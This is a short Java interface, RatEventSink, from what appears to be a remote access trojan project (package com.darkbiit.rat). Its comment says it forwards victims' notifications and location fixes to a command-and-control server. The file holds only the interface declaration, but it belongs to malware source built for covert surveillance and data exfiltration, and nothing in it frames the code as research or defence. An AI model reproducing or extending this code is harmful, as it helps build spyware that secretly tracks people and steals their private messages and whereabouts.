package com.darkbiit.rat;

import java.util.Map;

/**
 * Pushes unsolicited events (notifications, location fixes) to the C2.
 *
 * Implemented by RatService; the notification listener and the location
 * tracker write into it.
 */
public interface RatEventSink {
    void onEvent(String type, Map<String, Object> payload);
}
